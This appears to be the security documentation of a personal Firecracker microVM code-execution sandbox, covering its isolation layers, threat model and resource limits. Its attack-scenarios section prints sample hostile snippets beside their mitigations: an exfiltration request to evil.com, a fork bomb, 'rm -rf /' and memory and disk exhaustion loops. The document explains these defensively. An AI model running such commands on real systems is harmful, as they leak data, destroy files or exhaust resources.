# Security Documentation

This document describes the security architecture, isolation guarantees, and threat model of the Firecracker Sandbox Engine.

---

## Table of Contents

1. [Overview](#overview)
2. [Isolation Guarantees](#isolation-guarantees)
3. [Security Layers](#security-layers)
4. [Threat Model](#threat-model)
5. [Attack Scenarios \u0026 Mitigations](#attack-scenarios--mitigations)
6. [Resource Limits](#resource-limits)
7. [Known Limitations](#known-limitations)
8. [Security Best Practices](#security-best-practices)

---

## Overview

The Firecracker Sandbox Engine is designed to execute **untrusted code** safely. It achieves this through **multiple layers of isolation**, with hardware-level virtualization as the primary defense.

### Security Philosophy

> **Defense in depth:** Multiple independent security layers ensure that even if one layer fails, others provide protection.

**Layers:**
1. **API Layer** - Input validation, authentication (future)
2. **Host Layer** - Process isolation, Linux security features
3. **VM Layer** - Hardware virtualization (KVM), separate kernel

---

## Isolation Guarantees

### What This System Guarantees

✅ **Code cannot access the host filesystem**  
- Each microVM has its own isolated root filesystem
- Host files are never mounted inside VMs

✅ **Code cannot make network requests**  
- No network devices configured in VMs
- Only vsock for controlled host communication
- No TCP/IP stack available

✅ **Code cannot exceed resource limits**  
- Hard memory limit: 256MB (enforced by KVM)
- CPU limit: 2 vCPUs (no more available)
- Time limit: 30 seconds (force-killed by timeout)

✅ **Code cannot persist state between executions**  
- VMs are destroyed after each execution
- Filesystem changes are ephemeral

✅ **Code cannot interfere with other executions**  
- Complete hardware-level isolation
- No shared memory, no shared kernel

✅ **Code cannot escalate privileges**  
- No setuid binaries in VM
- No sudo or privilege escalation tools
- No capability to change user context

---

## Security Layers

### Layer 1: API Layer

**Protections:**
- Input validation (JSON schema)
- Language whitelist (only Python, Node.js, Bash, Go)
- Request size limits (prevents DoS)
- Queue buffer (prevents resource exhaustion)

**Future Enhancements (Sprint 7):**
- Authentication (JWT tokens)
- Per-user rate limiting
- IP-based throttling
- Request logging for audit trails

---

### Layer 2: Host Layer (Linux Server)

**Protections:**
- **Process isolation**: Each Firecracker process runs independently
- **User namespaces**: VMs run as unprivileged users (non-root)
- **seccomp filters**: Restrict system calls available to Firecracker process
- **cgroups**: Resource limits enforced at host level (backup)

**What the host does:**
- Manages VM lifecycle (boot, monitor, kill)
- Enforces timeout (kills hung VMs)
- Logs execution metadata
- Prevents Firecracker escape via OS-level security

---

### Layer 3: VM Layer (Firecracker MicroVM)

This is the **primary security boundary**.

**Hardware Virtualization (KVM):**
- Uses Intel VT-x / AMD-V for hardware-assisted virtualization
- Each VM has its own isolated memory space
- VMs cannot access host memory
- VMs run on separate kernel instances

**Firecracker Features:**
- Minimal attack surface (no BIOS, no legacy devices)
- No PCI devices (removes entire attack vector)
- No emulated devices (no USB, sound, graphics)
- Single virtio-block device (read-only rootfs)
- vsock for communication (safer than networking)

**VM Configuration:**
- Read-only root filesystem (`/`)
- Writable `/tmp` (ephemeral, destroyed after execution)
- No swap (prevents memory leaks)
- No kernel modules (prevents privilege escalation)

---

## Threat Model

### Adversary Goals

An attacker submitting malicious code may attempt to:

1. **Steal data** from the host or other users
2. **Escape the VM** to gain host access
3. **Consume unlimited resources** (DoS attack)
4. **Persist malware** across executions
5. **Exfiltrate data** via network
6. **Attack other microVMs**

---

### Threat Analysis

| Threat | Likelihood | Impact | Mitigation |
|--------|-----------|--------|------------|
| **VM Escape** | Very Low | Critical | Firecracker's minimal attack surface, KVM hardening |
| **Resource Exhaustion** | Medium | Medium | Hard limits (256MB RAM, 30s timeout, 2 vCPU) |
| **Data Exfiltration** | Very Low | High | No network access, no outbound connections |
| **Kernel Exploit** | Low | Critical | Separate kernel per VM, no shared kernel |
| **DoS via Queue Flood** | Medium | Medium | Queue buffer (100 jobs), returns 503 when full |
| **Side-Channel Attacks** | Low | Low | Short-lived VMs, no sensitive data in memory |

---

## Attack Scenarios \u0026 Mitigations

### 1. Network-Based Attacks

**Attack:** Attacker tries to make HTTP requests to steal API keys

```python
import urllib.request
urllib.request.urlopen("http://evil.com?data=stolen")
```

**Mitigation:**
- ✅ **No network devices** in VM
- ✅ Error: `URLError: <urlopen error [Errno -3] Temporary failure in name resolution>`
- ✅ DNS unavailable, no route to internet

---

### 2. Fork Bomb

**Attack:** Create infinite processes to crash the system

```python
import os
while True:
    os.fork()
```

**Mitigation:**
- ✅ **Process limit** in VM (ulimit)
- ✅ **Memory limit** (256MB) prevents unbounded process creation
- ✅ **Timeout** kills VM after 30 seconds
- ✅ Error: `OSError: [Errno 11] Resource temporarily unavailable`

---

### 3. File System Attacks

**Attack:** Try to delete critical system files

```bash
rm -rf /
```

**Mitigation:**
- ✅ **Read-only root filesystem** (`/`)
- ✅ Error: `rm: can't remove '/bin': Read-only file system`
- ✅ Only `/tmp` is writable (ephemeral)

**Attack:** Fill up disk space

```python
with open('/tmp/bigfile', 'w') as f:
    f.write('A' * 10**9)  # 1GB file
```

**Mitigation:**
- ✅ **Disk quota** on `/tmp` (limited size)
- ✅ **Memory limit** (256MB) constrains buffer cache
- ✅ Error: `OSError: [Errno 28] No space left on device`

---

### 4. Memory Exhaustion

**Attack:** Allocate unlimited memory

```python
data = [0] * (10**10)  # Try to allocate 10GB
```

**Mitigation:**
- ✅ **Hard memory limit** (256MB)
- ✅ **OOM Killer** terminates process
- ✅ Exit code: 137 (SIGKILL from OOM)
- ✅ Response: `{"termination_reason": "oom_kill"}`

---

### 5. CPU Exhaustion

**Attack:** Infinite loop to consume CPU

```python
while True:
    pass
```

**Mitigation:**
- ✅ **2 vCPU limit** - Can't consume more than 2 cores
- ✅ **30-second timeout** - Force-killed after time limit
- ✅ Other VMs unaffected (hardware isolation)
- ✅ Response: `{"termination_reason": "timeout"}`

---

### 6. Kernel Exploitation

**Attack:** Exploit kernel vulnerability to escape VM

```c
// Hypothetical kernel exploit
int fd = open("/dev/kvm", O_RDWR);
ioctl(fd, MALICIOUS_IOCTL, ...);
```

**Mitigation:**
- ✅ **Separate kernel** per VM (no shared kernel to exploit)
- ✅ **Minimal KVM API surface** exposed to guest
- ✅ **Firecracker's jailer** (optional) adds seccomp filters
- ✅ **No `/dev/kvm` inside VM** (guest can't access hypervisor)
- ✅ Even if kernel compromised, only affects single VM

---

### 7. Side-Channel Attacks (e.g., Spectre)

**Attack:** Use speculative execution to read host memory

```python
# Spectre-like attack
import ctypes
ctypes.pythonapi.Py_Initialize()
```

**Mitigation:**
- ⚠️ **Partial**: Side-channels are hard to eliminate fully
- ✅ **Short-lived VMs** reduce attack window
- ✅ **No sensitive data** loaded in VM memory
- ✅ **CPU mitigations** (KPTI, retpoline) applied at host
- ✅ **Future**: Consider disabling SMT (hyperthreading)

---

### 8. vsock Exploitation

**Attack:** Send malicious vsock packets to crash guest agent

```python
import socket
sock = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
sock.connect((2, 1234))
sock.send(b"A" * 10000000)  # Buffer overflow attempt
```

**Mitigation:**
- ✅ **Input validation** in guest agent
- ✅ **Message size limits** (max 1MB payload)
- ✅ **Structured protocol** (JSON with schema validation)
- ✅ **Timeout on reads** (prevents hang)
- ✅ Even if agent crashes, VM is destroyed after execution

---

## Resource Limits

### Per-Execution Limits

| Resource | Limit | Enforcement | Consequence |
|----------|-------|-------------|-------------|
| **Memory** | 256 MB | KVM hard limit | OOM killer terminates process (exit 137) |
| **CPU** | 2 vCPUs | VM configuration | Cannot hog more than 2 cores |
| **Time** | 30 seconds | Host timeout | VM force-killed, context canceled |
| **Disk (tmp)** | ~50 MB | Filesystem quota | Write fails with ENOSPC |
| **Processes** | 100 | ulimit | Fork fails with EAGAIN |
| **File Descriptors** | 1024 | ulimit | Open fails with EMFILE |

### System-Wide Limits

| Resource | Limit | Reason |
|----------|-------|--------|
| **Concurrent Jobs** | 100 | Queue buffer prevents unbounded growth |
| **Concurrent Workers** | 10 | Limits host CPU/memory usage |
| **VM Pool Size** | 3 | Balances performance vs. resource usage |

---

## Known Limitations

### What This System Does NOT Protect Against

❌ **Timing attacks** - Execution duration may leak information  
❌ **Side-channel attacks** - Spectre/Meltdown require CPU-level mitigations  
❌ **Host-level DoS** - Submitting 1M requests could overwhelm server (needs rate limiting)  
❌ **Data exfiltration via timing** - Attacker could encode data in execution time  
❌ **Malicious MicroVM snapshots** - If snapshots are introduced, need integrity checks  

### Future Security Enhancements (Sprint 7+)

- [ ] **Authentication** - JWT tokens, API keys
- [ ] **Rate limiting** - Per-user, per-IP throttling
- [ ] **Audit logging** - All executions logged with user ID
- [ ] **Content filtering** - Block dangerous imports (e.g., `import socket`)
- [ ] **Firecracker Jailer** - Additional sandboxing for Firecracker process
- [ ] **SELinux/AppArmor** - Mandatory access control policies
- [ ] **Encrypted vsock** - TLS for host-guest communication

---

## Security Best Practices

### For System Administrators

1. **Run on isolated hosts**
   - Dedicate servers to code execution workload
   - Don't co-locate with sensitive services

2. **Keep software updated**
   - Update Firecracker regularly (security patches)
   - Update Linux kernel (KVM vulnerabilities)
   - Update language runtimes (Python, Node.js)

3. **Monitor for anomalies**
   - Track execution durations (detect mining)
   - Alert on high failure rates
   - Monitor resource usage trends

4. **Implement authentication**
   - Don't expose API publicly without auth
   - Use API keys or JWT tokens
   - Rate limit per user

5. **Network segmentation**
   - Firewall rules to prevent lateral movement
   - No outbound internet from execution hosts

---

### For Developers

1. **Validate all inputs**
   - Check code size limits
   - Whitelist languages
   - Sanitize output before display (XSS)

2. **Implement retry logic**
   - Handle 503 (queue full) gracefully
   - Exponential backoff

3. **Set client-side timeouts**
   - Don't wait forever for responses
   - Timeout = 35s (slightly more than server timeout)

4. **Sanitize output**
   - Truncate large outputs (prevent client DoS)
   - Escape special characters in web UIs

---

## Incident Response

### If a Security Issue is Discovered

1. **Assess severity**
   - Can attacker escape VM?
   - Can attacker access other users' data?
   - Is it a DoS or data breach?

2. **Immediate actions**
   - If critical: Shut down API immediately
   - If medium: Apply temporary mitigations (e.g., disable language)
   - If low: Monitor and plan fix

3. **Patching process**
   - Update Firecracker/kernel
   - Deploy new rootfs with patched runtimes
   - Test thoroughly before re-enabling

4. **Disclosure**
   - Notify users of downtime (if applicable)
   - Publish post-mortem (transparency)

---

## Security Audits

**Current Status:** No professional audit yet (personal project)

**Recommended for Production:**
- Hire security firm for penetration testing
- Focus areas:
  - VM escape attempts
  - Resource exhaustion attacks
  - vsock protocol fuzzing
  - Kernel exploit testing

---

## Compliance

### Relevant Standards

- **OWASP Top 10** - Injection, broken access control
- **CWE-78** - OS Command Injection (mitigated by VM isolation)
- **CWE-400** - Resource Exhaustion (mitigated by limits)

---

## Responsible Disclosure

If you discover a security vulnerability:

1. **Do NOT** disclose publicly until patched
2. Email: [Your Security Email]
3. Include:
   - Description of vulnerability
   - Proof-of-concept (if possible)
   - Impact assessment
4. Expect response within 48 hours

**Bug Bounty:** Not currently available (open-source project)

---

## Conclusion

This system provides **strong isolation guarantees** through Firecracker's hardware-level virtualization. While no system is 100% secure, the defense-in-depth approach ensures that even if one layer fails, others provide protection.

**For most use cases (coding challenges, interview platforms, educational tools), this security model is sufficient.**

**For handling extremely sensitive workloads, additional measures (authentication, audit logging, network segmentation) should be implemented.**

---

**Last Updated:** Sprint 8  
**Security Version:** v0.1  
**Reviewed by:** Abhishek Dadwal
